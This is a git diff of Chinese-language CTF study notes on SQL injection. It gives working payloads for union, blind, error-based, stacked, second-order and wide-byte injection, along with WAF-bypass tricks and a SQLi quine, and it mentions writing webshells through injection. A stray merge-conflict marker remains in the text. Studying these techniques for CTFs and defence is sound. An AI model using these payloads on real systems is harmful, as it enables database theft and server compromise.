@@ -1,14 +1,29 @@
 ## 常见
 
-| 考点                          |                                                                            |
-| ----------------------------- | -------------------------------------------------------------------------- |
-| 0.测试                        | 1' order by 1 -- [123456] 测试                                             |
-| 1.联合查询                    | union select group_concat(username,0x7e,password),2,3 from...，order by... |
-| [2.布尔盲注](#2布尔盲注)      | if(ascii(substr(database(),1,1))>100,1,0)                                  |
-| [4.报错注入](#4报错注入)      |                                                                            |
-| [5.堆叠注入](#5堆叠注入)      | 使用 prepare 绕过                                                          |
-| 二次注入                      |
-| [过滤了单引号](#过滤了单引号) |
+| 考点                            |                                                                            |
+| ------------------------------- | -------------------------------------------------------------------------- |
+| 0.测试                          | 1' order by 1 -- [123456] 测试                                             |
+| 1.联合查询                      | union select group_concat(username,0x7e,password),2,3 from...，order by... |
+| [2.布尔盲注](#2布尔盲注)        | if(ascii(substr(database(),1,1))>100,1,0)                                  |
+| [4.报错注入](#4报错注入)        |                                                                            |
+| [5.堆叠注入](#5堆叠注入)        | 使用 prepare 绕过                                                          |
+| 二次注入                        |
+| [过滤了单引号](#过滤了单引号)   |
+| [bypass](bypass_.md#sql-bypass) |
+
+注入格式
+
+| Column                                        | 测试 1                                                                                                                  | 测试 2 |
+| --------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- | ------ |
+| ?id=1''                                       | ?id='1'                                                                                                                 |        |
+| $id                                           | 1''                                                                                                                     | '1'    |
+| $id 结果                                      | 正常                                                                                                                    | 正常   |
+| '$id'                                         | '1'''                                                                                                                   | ''1''  |
+| '$id'结果                                     | 正常                                                                                                                    | 错误   |
+| `select * from user where username = '$name'` | 密码是 md5 方式, `-1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#`                                       |
+| \`uid\` in('1'); <br> \`uid\` in($id);        | 后面会补括号 <br> `1) or updatexml(1,concat(0x7e,version(),0x7e),1`<br>`1 or updatexml(1,concat(0x7e,version(),0x7e),1` |
+
+> > > > > > > fb0c8d90748fbc0f5a438e9bdd052281643010f0
 
 ### 2.布尔盲注
 
@@ -40,47 +55,51 @@ ${id} = if(ascii(substr((select flag from flag),{},1))>{},1,2)
 select * from users where id= 1;create table test like users;
 -1';set @t=concat('sel','ect flag from `1919810931114514`');prepare te from @t;execute te;#
 ```
+
 ### 二次注入
+
 `[RCTF2015]EasySQL`
 注册以下用户
+
 ```sh
 admin"
 admin'
 admin')
 admin")
 ```
-admin" 在修改密码时报错，说明"闭合 二次注入，猜测sql
+
+admin" 在修改密码时报错，说明"闭合 二次注入，猜测 sql
+
 ```sql
 update 表 set password='xxx' where username="xx" and pwd='xx'
 ```
 
 ## 常见的 SQL 注入考点 CTF-123458
 
-```
-    3.时间盲注: if(ascii(substr(database(),1,1))>100,sleep(5),1)
+```bash
+3.时间盲注: if(ascii(substr(database(),1,1))>100,sleep(5),1)
 
-    6.二次注入:通过在一处输入点构造sql语句，在第二处触发
-               -- 1.登陆:邮箱。密码 2.登陆后:限制用户名,显示用户名 -- 可能二次注入 -- 网鼎杯2018unfinish
-    7.宽字节注入:通过数据库编码错误来绕过字符转义
-                sql = 'select *from user where id=\''.$id.'\'';
-                GBK两个字符为一个汉字, 输入宽字符%df使反斜杠和这个%df形成一个汉字
-                GET方式 id=1%df' union select 1,database(),3%23
-                POST方式-没有url解码 username=1汉') or 1=1#
-                        -配合盲注完成
-    9.sql注入读写文件:通过sql注入写入webshell,或直接读取服务器文件
-    10.sql注入提权:通过sql注 入获取服务器权限
-    - 读取数据 见0x10
-    - 绕过字符  /**/替换空格, 用<a>无意义填充过waf , 看bypass
-                ()替换空格or(1)=(1) , or('1')='1'
-    load_file
-    head 注入 useragent进行报错注入
-    MySQL查询的按位比较 -- CTFshow web1, [GYCTF2020]Ezsqli
+6.二次注入:通过在一处输入点构造sql语句，在第二处触发
+        -- 1.登陆:邮箱。密码 2.登陆后:限制用户名,显示用户名 -- 可能二次注入 -- 网鼎杯2018unfinish
+7.宽字节注入:通过数据库编码错误来绕过字符转义
+        sql = 'select *from user where id=\''.$id.'\'';
+        GBK两个字符为一个汉字, 输入宽字符%df使反斜杠和这个%df形成一个汉字
+        GET方式 id=1%df' union select 1,database(),3%23
+        POST方式-没有url解码 username=1汉') or 1=1#
+                -配合盲注完成
+9.sql注入读写文件:通过sql注入写入webshell,或直接读取服务器文件
+10.sql注入提权:通过sql注 入获取服务器权限
+- 读取数据 见0x10
+- 绕过字符  /**/替换空格, 用<a>无意义填充过waf , 看bypass
+        ()替换空格or(1)=(1) , or('1')='1'
+load_file
+head 注入 useragent进行报错注入
+MySQL查询的按位比较 -- CTFshow web1, [GYCTF2020]Ezsqli
 
-    SQLi-Quine  $row['password'] === $password, 输入的password值等于查询出来的值
-                http://y24.top/go?_=06d458b6b3aHR0cHM6Ly93d3cuc2h5c2VjdXJpdHkuY29tL3Bvc3QvMjAxNDA3MDUtU1FMaS1RdWluZQ%3D%3D
-                https://www.shysecurity.com/post/20140705-SQLi-Quine
-                'UNION/**/SELECT/**/REPLACE(REPLACE('"UNION/**/SELECT/**/REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")/**/AS/**/a#',CHAR(34),CHAR(39)),CHAR(37),'"UNION/**/SELECT/**/REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")/**/AS/**/a#')/**/AS/**/a#
-
+SQLi-Quine  $row['password'] === $password, 输入的password值等于查询出来的值
+        http://y24.top/go?_=06d458b6b3aHR0cHM6Ly93d3cuc2h5c2VjdXJpdHkuY29tL3Bvc3QvMjAxNDA3MDUtU1FMaS1RdWluZQ%3D%3D
+        https://www.shysecurity.com/post/20140705-SQLi-Quine
+        'UNION/**/SELECT/**/REPLACE(REPLACE('"UNION/**/SELECT/**/REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")/**/AS/**/a#',CHAR(34),CHAR(39)),CHAR(37),'"UNION/**/SELECT/**/REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")/**/AS/**/a#')/**/AS/**/a#
 ```
 
 ## Other
@@ -98,16 +117,6 @@ name= 'safasfascyxqagasgasfasfas'
 name rlike cyxq
 username=admin\&password=||(password)rlike(0x{})#
 ```
-
-综合分析
-
-| Column    | 测试 1  | 测试 2 |
-| --------- | ------- | ------ |
-| ?id=1''   | ?id='1' |        |
-| $id       | 1''     | '1'    |
-| $id 结果  | 正常    | 正常   |
-| '$id'     | '1'''   | ''1''  |
-| '$id'结果 | 正常    | 错误   |
 
 1.  在用户名或密码处加引号测试
 
